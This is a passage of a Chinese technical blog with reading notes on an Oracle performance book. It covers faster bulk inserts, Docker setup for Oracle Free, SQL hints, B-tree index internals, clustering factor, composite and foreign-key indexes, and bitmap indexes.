00:00:01.28SQL&gt; set timing on\n\nSQL&gt; exec proc1;PL/SQL procedure successfully completed.Elapsed: 00:00:53.68SQL&gt; select count(*) from t;  COUNT(*)----------    100000Elapsed: 00:00:00.09\n\n耗时53秒68，每秒两千条不到。\n共享池中缓存下来的SQL语句以及HASH出来的唯一值，都可以在v$sql中对应的 SQL_TEXT 和 SQL_ID 字段中查询到而解析的次数和执行的次数分别可以从 PARSE_CALL 和 EXECUTIONS 字段中获取。由于这个过程PROC1执行的是 insert into t 的系列插入，于是我们执行如下语句来查询PROC1在数据库共享池中执行的情况，具体如下：\nselect t.sql_text,t.sql_id,t.PARSE_CALLS,t.EXECUTIONSfrom v$sql twhere sql_text like &#x27;%insert into t values%&#x27;;\n\n\n可以看到共享池中有大量相似的sql，他们的sql_id都不一样，每个语句都被解析了一次、执行了一次。这些sql都是高度相似的，如果这些语句都能合并成一种写法，不是就可以只解析一次，然后执行十万次，节省了解析的时间。\n绑定变量，摩托速度create or replace procedure proc2asbegin    for i in 1..100000        loop            execute immediate                &#x27;insert into t values (:x)&#x27; using i;            commit;        end loop;end;\n\nSQL&gt; exec proc2;PL/SQL procedure successfully completed.Elapsed: 00:00:03.50\n\n耗时3秒50，每秒八千多条。看来sql的解析还是很耗时的。\n\n静态改写，汽车速度execute immediate 是一种动态SQL的写法，常用于表名字段名是变量、入参的情况，由于表名都不知道，所以当然不能直接写SQL语句了。所以要靠动态SQL语句根据传入的表名参数，来拼成一条SQL语句，由 execute immediate 调用执行。但是这里显然不需要多此一举，因为insert into t values()完全可以满足需求，表名就是t，是确定的。\ncreate or replace procedure proc3asbegin    for i in 1..100000        loop            insert into t values (i);            commit;        end loop;end;\n\nSQL&gt; exec proc3;PL/SQL procedure successfully completed.Elapsed: 00:00:03.19\n\n耗时3秒19，又快了一些。\n一般来说，静态SQL会自动使用绑定变量\n从执行情况可以看到proc3也实现了绑定变量，而且动态SQL的特点是执行过程中再解析，而静态SQL的特点是编译的过程就解析好了。这点差别就是速度再度提升的原因。\n批量提交，动车速度commit 放在里面意味着每插入1条，就要提交1次，那放在循环里就要提交10万次，而放在循环外就是全部插入完后提交1次。commit 触发 LGWR 将 REDO BUFFER 写出到 REDO LOG 中，并且将回滚段的活动事务标记为不活动，同时让回滚段中记录对应前镜像记录的所在位置标记为可以重写。切记 commit 可不是写数据的动作，写数据将数据从 DATA BUFFER 刷出磁盘是由 CKPT。\nSQL&gt; exec proc4;PL/SQL procedure successfully completed.Elapsed: 00:00:03.02\n\n集合写法，飞机速度insert into t select rownum from dual connect by level&lt;=100000;\nSQL&gt; insert into t select rownum from dual connect by level&lt;=100000;100000 rows created.Elapsed: 00:00:00.14\n\n耗时仅0.14秒因为原先的过程变为了sql，一条条插入的语句变成了一个集合的概念，变成了一整批地写进 DATA BUFFER 区里。好比你要运砖头到目的地，一种是一块砖头拿到目的地，再返回拿第二块，直到拿完全部。而另一种是全部放在板车一起推至目的地，只是这里的目的地是 DATA BUFFER 区而已。\n直接路径，火箭速度时间已经很小了，这时可能会有误差，所以将数据量放大到200万。没加太大是因为我这小服务器内存不够\nSQL&gt; insert into t select rownum from dual connect by level&lt;=2000000;2000000 rows created.Elapsed: 00:00:01.74\n\n耗时1.74秒。\n下面使用 create table 的直接路径方式来新建t表。create table t as select rownum x from dual connect by level&lt;=2000000;\nSQL&gt;  create table t as select rownum x from dual connect by level&lt;=2000000;Table created.Elapsed: 00:00:01.73\n\n区别不是很大，可能因为数据量的关系。\n并行设置，飞船速度最后，如果遇到性能好的机器，还是可以大幅度提升性能的。设置日志关闭 nologging 并且设置 parallel 4 表示用到机器的4个CPU。这里还是受限于机器了\nSQL&gt; create table t nologging parallel 4 as select rownum x from dual connect by level&lt;=2000000;Table created.Elapsed: 00:00:01.74\n\n\nOracle 环境的搭建中间有段时间没有连着写，是去搭建Oracle环境了。毕竟公司的测试环境没有dba权限，还是自己搭一个比较好。这里为了方便，采用官方的docker镜像进行部署。\n首先用 docker pull container-registry.oracle.com/database/free:latest 拉取镜像。镜像比较大，需要等一段时间。确保磁盘有足够的空间，我这里拉取的镜像id是 7510f8869b04如果下载过慢，或者内存不足，可以参考下面修改docker的配置文件 sudo vim /etc/docker/daemon.json\n&#123;  &quot;data-root&quot;: &quot;/new_dir/docker&quot;,  &quot;registry-mirrors&quot;: [    &quot;http://hub-mirror.c.163.com&quot;  ]&#125;\n\ndata-root 是docker数据存储位置registry-mirrors 是镜像加速地址，这里使用的是网易的镜像加速地址保存后重启docker即可，sudo systemctl start docker\n镜像拉取完成后，就可以构建启动容器了。docker run -d --name oracle -h oracle -p 1521:1521 -v /etc/localtime:/etc/localtime:ro container-registry.oracle.com/database/free:latest\n\n-d: 这是一个标志，表示以守护态（detached mode）运行容器，即在后台运行，不会把容器的输出直接打印到当前终端。\n–name oracle: 为新创建的容器指定一个名字 oracle，便于后续引用和管理。\n-h oracle: 设置容器的主机名（hostname）为 oracle。这对于某些依赖主机名的应用配置是有帮助的。\n-p 1521:1521: 映射容器的端口 1521 到宿主机的端口 1521。这允许外部通过宿主机的 1521 端口访问容器中的 Oracle 数据库服务。\n-v &#x2F;etc&#x2F;localtime:&#x2F;etc&#x2F;localtime:ro: 使用卷挂载的方式，将宿主机的 &#x2F;etc&#x2F;localtime 文件或目录以只读（read-only）模式挂载到容器的 &#x2F;etc&#x2F;localtime。这样做是为了确保容器内的时间与宿主机保持一致，避免时区问题。\n\n使用 docker logs -f oracle 查看容器日志，当出现 DATABASE IS READY TO USE! 时，即启动成功。后面就可以愉快地使用Oracle了。\ndocker exec -it oracle sqlplus sys@localhost:1521/FREE as sysdba 进入容器内，并进行登录。\nHINT在SQL查询中，HINT 是一种向数据库优化器提供提示的方式，用来指导SQL执行计划的选择。HINT 不是SQL语言的标准组成部分，而是数据库特有的优化手段，它通常以注释的形式出现在SQL语句中，让数据库的查询优化器遵循某种特定的执行路径或采用特定的算法来处理查询。\n在Oracle数据库中，HINT的写法通常是在表名或视图名后面紧跟一个特定的提示关键字或短语，这些提示被包围在 &#x2F;*+ … *&#x2F; 注释符号内。例如，如果你想提示优化器使用特定的索引，可以这样写：\nSELECT /*+ INDEX(table_name index_name) */ column1, column2FROM table_nameWHERE some_condition;\n\n在这个例子中，INDEX(table_name index_name) 是一个HINT，告诉优化器使用名为 index_name 的索引来访问 table_name。\n还有一些常见的HINT，如：\n\nFULL(table_name) 强制全表扫描。\nUSE_NL(a b) 强制使用嵌套循环连接(a表和b表)。\nUSE_HASH(a b) 强制使用哈希连接(a表和b表)。\nPARALLEL(table_name, degree) 指定表并行查询的度数。\nLEADING(table_name[, ...]) 指定连接顺序的起始表。\n\n需要注意的是，使用HINT应当谨慎，因为它们会绕过数据库自动优化机制，只有在明确知道优化器选择的执行计划不如预期高效时才应考虑使用。而且，随着数据库版本的更新或数据分布的变化，曾经有效的HINT可能不再是最优选择，因此定期审查和调整HINT是必要的。\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"《收获，不止Oracle》读书笔记上篇-索引","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8A%E7%AF%87-%E7%B4%A2%E5%BC%95/","content":"第五章 - 惊叹，索引天地妙不可言BTREE 索引BTREE 索引结构图索引和表一样，都是前面描述的逻辑体系结构中的段的一种，当建一个T表，就产生一个T表的表SEGMENT，当在T表的某些列上建索引DXT，就产生一个DXT的索引SEGMENT。索引是建在表的具体列上，其存在的目的是让表的查询更快，效率更高。表记录丢失关乎生死，而索引丢失只需重建即可，似乎听起来索引只是表的一个附属产品，可有可无。但索引却是数据库学习中最实用的技术之一。\n\n以上结构图说明索引是由Root(根块)，Branch(茎块)和Leaf(叶子块)三部分组成的。其中Leaf(叶子块)主要存储了key column value(索引列具体值)，以及能具体定位到数据块所在位置的rowid(注意区分索引块和数据块)。比如：select * from t where id = 12; 该test表的记录有10050条，而id&#x3D;12仅返回1条，test表的id列建了一个索引，索引是如何快速检索到数据的呢，接下来分析这个索引查询示例图\n\n通过分析该图片，可以大致理解，定位到select * from t where id = 12;大致只需要3个IO(此处只是举个例子，1万多条记录实际情况可能只需要2个IO,这个和索引的高度有关，后续会深入讨论)。首先查询定位到索引的根部，这里是第1次IO接下来根据根块的数据分布，定位到索引的茎部（查询到12的值的大致范围，11..19的部分），这是第2次IO然后定位到叶子块，找到 id&#x3D;12 的部分，此处为第3次IO。假设Oracle在全表扫描记录，遍历所有的数据块，IO的数量必然将大大超过3次。有了这个索引，Oracle只会去扫描部分索引块，而非全部，少做事，必然能大大提升性能。\n根据id列上的索引来查询数据只需要访问索引块，不需要访问数据块吗？显然不是的，这里的语句是select * from t where id=12，这个*表示要展现t表的所有字段，显然只访问索引是不可能包含表的所有字段的，因为该索引只是对id列建索引，也就存储了id列的信息而已。因此上述查询访问完索引块后，必然要再访问数据块，比较快捷的方法是用索引块存储的rowid来快速检索数据块（具体在后续章节会描述）所以3次IO显然是不对的，理应增加一次从索引块到数据块获取各个列信息的检索动作，至少是4次IO才对。\n什么情况下查询可以只访问索引而不访问表呢？如果查询只检索索引列信息，就可以不访问表了，比如查询改成 select id from t where id=12 时就是这种情况。\n建立索引的步骤有一张test表，该表有大致name(varchar22(20),id(number),height(number),age(number)等字段。当前该表有记录，我们要对test表的id列建索引，create index idx id on test(id);\n要建索引先排序未建索引的test表大致记录如下图所示，NULL表示该字段为空值，此外省略号表示略去不显示内容。注意rowid伪列，这个是每一行的唯一标记，每一行的rowid值绝对不重复，可定位到行的记录在数据库中的位置（具体在后续的章节中详细介绍)。\n\n建索引后，先从test表的id列的值顺序取出数据放在内存中（这里需注意，除了id列的值外，还要注意到取该列的值的同时，该行的rowid也被一并取出)，如下图所示。\n\n列值入块成索引依次将内存中的顺序存放的列的值和对应的rowid存进Oracle空闲的BLOCK中，形成了索引块。\n\n填满一块接一块随着索引列的值的不断插入，index block1(L1)很快就被插满了，比如接下来取出的id&#x3D;9的记录无法插入index block1L1)中，就只有插入到新的Oracle块中，index block2(L2)。与此同时，发生了一件非常重要的事情，就是新写数据到另一个块index block3(B1)，这是为啥呢？原来L1和L2平起平坐，谁都不服谁，打起来了，不得了了，无组织无纪律哪能行，赶紧得有人管啊，于是index block3(B1)就担负起管理的角色，这个BLOCK记录了L1和L2的信息，并不记录具体的索引列的键值，目前只占用了B1一点点空间。L3用于管理L2和L2的信息，用于快速定位。\n\n同级两块需人管随着叶子块的不断增加，B1块中虽然仅是存放叶子块的标记，但也挡不住量大，最终也容纳不下了。怎么办？接着装呗，到下一个块B2块去寻找空间容纳。这时B1和B2也平起平坐了。这时又需要另一个块来记录B1、B2的信息，最上层的oot根块诞生了。后续还会出现B3、B4…如果有一天，这些Bn把root块撑满了，root块就不是root块了，他的上面就又有别的块来记录它的信息。\n\n索引结构的三大重要特点索引高度较低\n从下往上看，这个索引树的高度不会很高最底层的叶子块index block因为装具体的数据，所以比较容易被填满，特别是对长度很长的列建索引时更是如此。但是第1层之上的第2层的index block就很不容易装满了吧，因为第2层只是装第1层的指针而已，而第3层是装第2层的index block的指针，更不容易了…因此，这个树如果有很多层，那么表的数据量应该非常大。\n-- 查询占用表空间最大的表（排序）select t.owner,t.segment_name,t.tablespace_name,bytes/1024/1024/1024 as sizes,q.num_rows,t.segment_typefrom dba_segments t         left join dba_tables q                   on t.segment_name=q.table_name                       and t.owner=q.ownerwhere t.segment_type=&#x27;TABLE&#x27;  and t.tablespace_name=&#x27;TBS_FCCENTER_DATA&#x27;  --需要查看的表空间order by 4 desc-- 查询表索引的高度select index_name,       blevel,       leaf_blocks,       num_rows,       distinct_keys,       clustering_factorfrom user_ind_statisticswhere table_name in( &#x27;T&#x27;)order by blevel desc;\n\n看了下测试环境最大的一张表28G大小，快六百万数据，某列索引才4层。书中说有500G一张，记录有几百亿条，但是该表上某列索引的高度才不过6层而已。\n\nBLEVEL&#x3D;0这个层面表示只有叶子块，第1个索引块还没有装满，无须填入第2个块，所以没有上层块来管理，是1层高。而BLEVEL&#x3D;1这个层面表示这个阶段已经到第2层了，同理，BLEVEL&#x3D;2表示已经到第3层，只是还没有将其填满。\n\n索引存储列值\n索引存储了表的索引所在列的具体信息，还包含了标记定位行数据在数据库中位置的rowid取值。\n索引本身有序\n索引是顺序从表里取出数据，再顺序插入到块里形成索引块的，所以说索引块是有序的。\n索引高度较低的用处这里实验省略，语言描述。对于同样高度索引树的表进行查询，如果返回记录是1条。那么走索引查询的效率是差不多的。因为索引高度一样，所以产生的IO次数一样。\n而在没有索引的情况下，查询则会全表扫描，数据量大的话，会十分缓慢。索引的这个高度不高的特性给查询带来了巨大的便捷，但这里的查询只返回1条记录，如果查询返回绝大部分的数据，那用索引反而要慢得多。因为通过索引查到一条数据需要多次IO，取决于索引树的高度。通过索引查表的全量数据的话，需要的IO次数是全表扫描的数倍。同时，全表扫描可以对块进行多块读，进一步提高速度。\n表字段数量也会影响查询的效率。如果表字段很少，同一个块中所能存放的数据也就越多，全表扫描的逻辑读也不会太多。所以会快。相反，如果表字段很多，同一个块中存放的数据就会越少，全表扫描所需遍历的数据块也会增加，速度也就满下来了。\n\n下面是分区索引的设计误区。分区表的系分为两中，一种是局部索引，一种是全局索引。局部索引等同于为每个分区段建分区的索引，从user_segment的数据字典中，可以观察到表有多少个分区，就有多少个分区索引的segment。段的类型为 TABLE PARTITION。每个分区索引也是一个段，每个段的类型为 INDEX PARTITION。而全局索引，也就是普通索引。仅有一个段，段的类型为 INDEX。\n针对分区表的查询逻辑读相比于针对普通表的逻辑读会多好几倍，COST也一样。因为分区表的索引等同于查询了多个小索引，而小索引虽然体积比整个大索引小很多，但是高度却相差无几。这就导致单个小索引的查询和全局大索引的查询的IO数量差不多，而分区索引的IO个数还要乘以分区个数，所产生的IO会远大于全局索引产生的IO。所以分区索引的性能会低。\n因此分区表索引的设计是有讲究的，如果设置了分区索引，但是却用不到分区条件，性能将继续下降。如果建了分区索引，但是又根本无法加上分区字段的条件，那建议不要建分区索引。但如果查询中使用了分区字段的条件，那么结果就不一样了。只需要遍历其中的几个分区即可，效率也大幅提升。\n索引存储列值的用处count(*) 优化下面介绍索引存储列值及rowid的特性，其实身边最常见的语句性能的提升却往往是基于对这个特点的认识。\nselect count(*) from t; 是否能用到索引？\n表的情况和索引情况的差别在于表是把整行的记录依次放进BLOCK形成DATA BLOCK，而索引是把所在列的记录排序后依次放进BLOCK里形成INDEX BLOCK。既然在没有索引的情况下，DATA BLOCK中可以统计出表记录数，那INDEX BLOCK肯定也可以。方法就是前者汇总各个DATA BLOCK中的行的插入记录数，后者汇总各个INDEX BLOCK中的索引列的插入记录数。最关键的是，INDEX BLOCK里存放的值是表的特定的索引列，一列或者就几列，所需容纳空间要比存放整行也就是所有列的DATA BLOCK要少得多，所以这个查询用索引会很高效。\n但Oracle并不会选择走索引，而是选择了全表扫描。（实验略主要原因是索引不能存储空记录，这样如果表的索引列有空的记录，那依据索引来统计表的记录数肯定是不对的，所以Oracle才会选择全表扫描的执行计划。改变一下写法，select count(*) from t where id is not null;便可以让Oracle选择走索引。\n\n将索引列设为非空、或者设为主键（主键是非空的），也可以解决这个问题。\n\n什么时候在表的非空列建有索引时，COUNT(*)语句用索引效率不如全表扫描？如果一张表仅有一个字段，这个索引比表还大（多了rowid)，那从索引中查询，效率会不如全表扫描。\n什么时候COUNT(*)查询语句用索引扫描比全表扫描高效很多呢？表的字段很多，并且字段长度大多都很长，其中有一个非空且长度很短的列建了一个索引，这时索引的体积相对表来说特别小，那索引读效率就高多了。\nSUM&#x2F;AVG 优化select sum(id) from t; 是否能用到索引？是不能的，原因和上面一样，空值的问题。\nselect sum(id), avg(id), count(id) from t where id is not null;只需要一次索引扫描即可完成。\n因为一次扫描索引块，可以同时解决三个问题，所以效率与单个分别执行时一样高。不过列有空值理应不影响在索引中进行SUM和AVG等运算的，这里未指明非空则无法用到索引，其实是不应该的，这是优化器的缺陷。不知道新版本有没有优化\nMAX&#x2F;MIN 优化select max(id) from t; 是否能用到索引？是可以的。这个列的属性是否为空不应该影响能否使用索引作为‘瘦表’查询，但是奇怪的是MAX&#x2F;MIN时无论列是否为空都可以用到索引，而SUM&#x2F;AVG等聚合查询却必须要列为空方可用到索引。其实此类语句在运算时有无加上is not null的取值都是等价查询的，而COUNT(*)则不一样，有无is not null的取值可是不等价的！所以大概是优化器的问题\n执行计划中走索引的查询方式，索引的扫描方式会有很多种。这里先解释 INDEX FULL SCAN(MIN/MAX)这个INDEX FULL SCAN (MIN/MAX)只需要个位数的逻辑读就完成查询的秘密在于，MAX取值只需要往最右边的叶子块看一下，MAX的取值一定在最右边的块上，块里的最后一行就是。而MIN取值，仅往最左边的块里去望一望即可了，最小值一定在里头，块里的第一行记录就是。其中既包含了索引可以存储空值的技巧，又结合了索引是有序的技巧。查询只与索引树的高度有关，无论记录如何增大，查询效率都不会太低。\n但是，select min(id), max(id) from t;就变成全表扫描了。是null值的问题吗？select min(id), max(id) from t where id is not null; 走索引了，但走的是 INDEX FAST FULL SCAN并不是INDEX FULL SCAN (MIN/MAX)。改写成 select max, min from(select max(object_id)max from t) a, (select min(object_id)min from t) b; 就可以走INDEX FULL SCAN (MIN/MAX)了。虽然这种写法很奇怪。 \n索引回表与优化索引回表读(TABLE ACCESS BY INDEX ROWID)它表示通过索引访问表中的数据行。当执行计划中出现这种操作时，意味着Oracle使用索引找到特定行的ROWID（行标识符），然后使用这个ROWID直接访问表中的行。\n从索引中可以读到索引列的信息，但是不可能读到该列以外的其他列的信息.当查询是select * from t where object_id &lt;= 5时，这个*表示该表所有字段都需要返回。因此必然是在扫描索引块中定位到具体object_id&lt;&#x3D;5这部分索引块后，再根据这部分索引块的rowid定位到t表所在的数据块，然后从数据块中获取到其他字段的记录。\n所以只返回需要的字段，而不是使用*。有时可以避免回表读，以提高性能。\n关于TABLE ACCESS BY INDEX ROWID最佳的优化方式是，如果业务允许，可以巧妙地消除这个动作的产生，但是如果存在有些非索引的字段必须展现，可是又不多的情况，该如何优化呢？前面在业务允许的情况下，可以将select * from t where object_id &lt;= 5修正为select object_id from t where object_id&lt;=5从而消除回表，提升性能，假如有些字段必须展现，但又不多，该怎么办呢？比如select object_id,object_name from t where object_id &lt;= 5这个写法，非得展现object_name。可以考虑在object_id和object_name列建组合索引，即可消除回表动作。\n\n联合索引（Composite Index 或 Compound Index）是在多个列上创建的索引。它允许根据多个列的组合来对数据进行排序和快速访问。联合索引在Oracle数据库中非常常见，因为它们可以用于多种查询条件，从而提高查询效率。联合索引基于多个列的组合来构建索引树。当创建联合索引时，Oracle会根据索引定义中列的顺序来生成键值。键值由索引定义中的所有列组成，按照定义的顺序进行排序。联合索引的列顺序很重要。Oracle将按照列定义的顺序来构建键值。通常，将查询中最常用的列放在前面可以提高索引的利用率。\n\n建联合索引后，回表的动作TABLE ACCESS BY INDEX ROWID在执行计划中就没有了。不过这里要注意平衡，·如果联合索引的联合列太多，必然导致索引过大，虽然消减了回表动作，但是索引块变多，在索引中的查询可能就要遍历更多的BLOCK了，所以要全面考虑，联合索引不宜列过多，一般超过3个字段组成的联合索引都是不合适的。\n实际上，回表查询的速度也是有差异的，这里引出一个重要概念叫聚合因子。\n-- 建立无序的表drop table t_colocated purge;create table t_colocated (id number,col2 varchar2(100));begin    for i in 1..100000        loop            insert into t_colocated(id,col2)            values (i,rpad(dbms_random.random,95,&#x27;*&#x27;));    end loop;end;alter table t_colocated add constraint pk_t_colocated primary key(id);-- -- 建立有序的表drop table t_disorganized purge;create table t_disorganized as select id,col2 from t_colocated order by col2;alter table t_disorganized add constraint pk_t_disorg primary key (id);\n\n两张表中，id一个是按顺序插入的，一个是乱序的。而我们都知道，索引是有排列的，此时id列上的索引存放的数据也是有序的。表和索引两者的排列顺序相似度很高，就称之为聚合因子比较低。表和索引两者之间的排列顺序相似度差异明显，就称之为聚合因子比较高。\n通过数据字典来判断索引的聚合因子情况\nSQL&gt; select index_name,blevel,leaf_blocks,num_rows,distinct_keys,clustering_factor from user_ind_statistics where table_name in(&#x27;T_COLOCATED&#x27;,&#x27;T_DISORGANIZED&#x27;);INDEX_NAME                                                                                                                           BLEVEL LEAF_BLOCKS   NUM_ROWS DISTINCT_KEYS CLUSTERING_FACTOR-------------------------------------------------------------------------------------------------------------------------------- ---------- ----------- ---------- ------------- -----------------PK_T_COLOCATED                                                                                                                            1         208     100000        100000              1469PK_T_DISORG                                                                                                                               1         208     100000        100000             99940\n\n这里说明一下CLUSTERING_FACTOR的官方解释：表明有多少临近的索引条目指到不同的数据块。取值99944接近表记录的100000，说明绝大部分的临近索引条目都指向了不同的数据块。取值为1469说明总共只有1469个临近的索引条目指到了不同的数据块，总体还算不错。\n表的插入顺序和索引列的顺序基本一致，从索引中回表查找数据块将会更容易查找，其实通俗地说就是索引块A里装10行列信息及ROWID,这就可以理解为索引条目。然后根据索引条目的ROWID找到表记录时，如果聚合因子很小，10行索引条目可以全部在数据块B块中完整地找到。如果聚合因子很大，或许这10行索引条目对应的数据块的10行记录，分布在10个不同的数据块里。那就要访问了C块，D块，E块等等，回表查询的性能当然就低了。\n所以，当某列的读取频率远高于其他列，那就保证表的排列顺序和这列一致，按照这列的顺序，重组一下表记录来优化即可了。\n索引有序的用处order by 排序优化真正决定性能的是COST的高低和真实完成的时间，一般COST越小性能越高，Oracle执行计划的选择就是由COST来决定的。而时间也是非常简单的衡量的方式，完成时间越短性能越高。而逻辑读方面，是作为参考，在绝大部分情况下（甚至可以说90%以上的场合），逻辑读越少性能越快，但在这里却不适用了。排序算法有些特别，内部的机制导致性能和逻辑读关系不是太大，主要是消耗在CPU性能上，开销极大。此外如果PGA区无法容纳下排序的尺寸而进入磁盘排序，那将成为更大的性能杀手。\n因为索引是有序的，所以排序的查询走索引的话，可以减少排序次数，从而提高性能。\ndistinct 排重优化distinct 这个常见的排除重复数据的写法，会用到排序。排过序的数据更容易去重。\n从含有distinct的查询语句执行计划中，可以发现以及排序次数是0。但TempSpe却是有值的。TempSpc是临时表空间。实际上，DISTINCT是有排序的，只是在 AUTOTRACE 的 SORTS 关键字中不会显现而已。\nDISTINCT 会因为排序而影响性能，不过这里要注意一点，DISTINCT采用的是HASH UNIQUE的算法。其实如果语句修改为select distinct object id_from t where object_id=2这样的等值查询而非范围查询时，将产生SORT UNIQUE NOSORT的算法。\n含有 distinct 的查询语句，走索引查询时，是可以消除其所产生的排序的。不过现实中，DISTINCT语句靠索引来优化往往收效是不明显的，因为大多数情况用到DISTINCT都是因为表记录有重复，因此首要的是要考虑为什么重复。\n索引全扫与快速扫描INDEX FULL SCAN (MIN/MAX)，是针对最大最小取值的一种特别的索引扫描方式。INDEX RANGE SCAN，是一种针对索引高度较低这个特性实现的一种范围扫描，在返回记录很少时相当高效。\nINDEX FULL SCAN和INDEX FAST FULL SCAN的相同点，都是针对整个索引的全扫描，从头到尾遍历索引，而非局部的INDEX FULL SCAN(MIN&#x2F;MAX)和INDEX RANGE SCAN。INDEX FAST FULL SCAN比INDEX FULL SCAN多了一个FAST，所以差别就是索引快速全扫描INDEX FAST FULL SCAN比索引全扫描INDEX FULL SCAN更快。好像是废话那么为什么INDEX FAST FULL SCAN会比INDEX FULL SCAN更快，是因为索引快速全扫描一次读取多个索引块，而索引全扫一次只读取一个块。一次读取多个块不容易保证有序，而一次读取一个块可以保证有序，因此在有排序的场合，INDEX FULL SCAN的顺序读可以让排序消除，而INDEX FAST FULL SCAN虽然减少了逻辑读，但是排序这个动作却无法消除。\n所以说COUNT(*)和SUM之类的统计根本无须使用排序，一般都走INDEX FAST FULL SCAN，而涉及排序语句时，就要开始权衡利弊，也许使用INDEX FAST FULL SCAN更快，也许使用INDEX FULL SCAN更快，由Oracle的优化器计算出成本来选择。\nUNION 合并的优化UNION 合并后没有重复数据，和 DISTINCT 类似，是有排序操作的。UNION ALL 合并后有重复数据，只是简单的合并，不会有排序操作。\n但是这里的 union 是不能利用索引消除排序的。这是因为 union 操作的是两个不同的结果集的筛选，各自的索引当然没法生效。在某些业务场景下，两个 union 的表数据不可能出现重复时，使用 union all 而不使用 union，会提高查询效率。\n主外键设计主外键有三大特点：\n\n主键本身是一种索引\n可以保证表中主键所在列的唯一性\n可以有效地限制外键依赖的表的记录的完整性。\n\n其中前两个特点和CREATE UNIQUE INDEX建立的唯一性索引基本相同。\n外键建索引后，效率会更高，这和表连接的NESTED LOOPS连接方式有关，在后续表连接章节细说。\n在外键上建索引，还能有效避免锁的竞争。\n主外键最基本的一个功能：外键所在表的外键列取值必须在主表中的主键列有记录。否则会报错：ORA-02292 integrity constraint (string.string) violated - child record foundOracle提供的这些功能保证了多表记录之间记录的制约性。\n同样，如果子表中有记录，要删除主表中对应的主键记录，也会报错：ORA-02292 integrity constraint (string.string) violated - child record found级联删除的设置：ALTER TABLE t_c ADD CONSTRAINT fk_t_c_id FOREIGN KEY (t_id) REFERENCES t (id) ON DELETE CASCADE;。添加 ON DELETE CASCADE 关键字。设置级联删除后，删除主表的记录后，会自动将子表中对应的记录一起删除。慎用。\n如果有一张表的某字段没有重复记录，并且只有一个普通索引，该如何改造为主键？因为建主键的动作其实就是建了一个唯一性索引，再增加一个约束。所以 alter table t add constraint t_id_pk primary key(ID); 即可。\n组合索引设计当查询的列在索引或组合索引中时，可以避免回表。回表在执行计划中叫 TABLE ACCESS BY INDEX ROWID\n当组合列返回的记录比较少时，组合索引的效率会比较高。类似 select * from t where a = 1 and b = 2 这种情况，如果在a和b字段建联合索引是不可能消除回表的，因为返回的是所有字段。但是只要 a&#x3D;1 返回较多， b&#x3D;2 返回也较多，组合起来返回很少，就适合建联合索引。但过多的字段建联合索引往往是不可取的，因为这样会导致索引过大，不仅影响了定位数据，更严重影响了更新性能，一般不超过三个字段。\n如果 a &#x3D; 1 and b &#x3D; 2 的返回和前面的单独 a &#x3D; 1 或者单独 b &#x3D; 2 的返回记录数差别不大，那组合索引的快速检索就失去意义了，单独建某列索引更好，因为单独建立的索引体积比组合索引要小，检索的索引块也更少。但如果不是返回所有的列，就是回表的范畴了。组合索引可能更合适。\n\n在等值查询的情况下，组合索引的列无论哪列在前，性能都一样。组合索引在第一字段进行排序，值相同的情况下，对第二个字段进行排序。等值查询时，组合索引无论哪个在前都是一样的。查询到第一个条件的值后，查询第二个条件的值，因为是确定的值，同时索引是有序的，所以条件的顺序不影响查询效率。\n组合索引的两列，当一列是范围查询，一列是等值查询的情况下，等值查询列在前，范围查询列在后，这样的索引最高效。但范围查询不同，范围条件在前时，需要逐个去查符合范围条件的第二个等值条件，它在每个符合范围的值中都是有序的（每个部分都是有序的）而等值条件在前时，去查询符合等值条件的第二个范围条件，则要更简单。因为它整体是有序的。所以查询效率也更高。\n范围查询改写为in查询，in查询的效率更高。因为in可以看作多个等值查询，定位到记录后可以停止继续搜索。\n如果单列的查询列和联合索引的前置列一样，那单列可以不建索引，直接利用联合索引来进行检索数据。\n如果单列的取值不多，可能会用到索引，这种扫描被称为跳跃索引，不过应用场景不多。跳跃索引（Index Skip Scan）是Oracle数据库中的一种特殊的索引访问方式，用于处理包含空值（NULL）的多列索引。跳跃索引可以提高查询性能，尤其是在索引列中存在大量空值的情况下。跳跃索引的工作原理是让Oracle能够跳过那些不包含有效键值的节点，直接访问包含有效键值的节点。这样可以减少不必要的索引扫描，提高查询性能。\n\n不过索引也不是越多越好，虽然可以增加查询效率，减少查询的时间。但会影响更新效率，因为索引的维护需要时间。特别是大量的无序插入，在索引很多的情况下会十分的慢。可以先将索引失效，插入完成后重建索引。可以提升性能。\n\n对INSERT语句负面影响最大，有百害而无一利，只要有索引，插入就慢，越多越慢！\n对DELETE语句来说，有好有坏，在海量数据库定位删除少数记录时，这个条件列是索引列显然是必要的，但是过多列有索引还是会影响明显，因为其他列的索引也要因此被更新。在经常要删除大量记录的时候，危害加剧！\n对UPDATE语句的负面影响最小，快速定位少量记录并更新的场景和DELETE类似，但是具体修改某列时却有差别，不会触及其他索引列的维护。\n\n\n除了索引会影响更新语句外，建索引动作也需要谨慎。建索引会排序，而排序是非常耗CPU的一个动作，如果在系统繁忙时再增加大量排序，对系统来说无疑是雪上添霜。另外建索引的过程会产生锁，而且不是行级锁，是把整个表锁住，任何该表的DML操作都将被阻止。建索引是需要把当前索引列的列值都取出来，排序后依次插入块中形成索引块的，加上锁是为了避免此时列值被更新，导致顺序又变化了，影响了建索引的工作。\nalter index index_name monitoring usage; 对索引进行监控。select * from v$object_usage; 查询监控记录。其中 USED 字段表示索引是否被使用过。alter index index_name nomonitoring usage; 对索引解除监控。另外，要注意监控也是有代价的。\n位图索引create bitmap index index_name on table_name(field_name); 创建位图索引。\n位图索引（Bitmap Index）是一种用于数据库中的特殊类型的索引结构。它主要用于低基数（low cardinality）的列，即那些具有相对较少不同值的列。 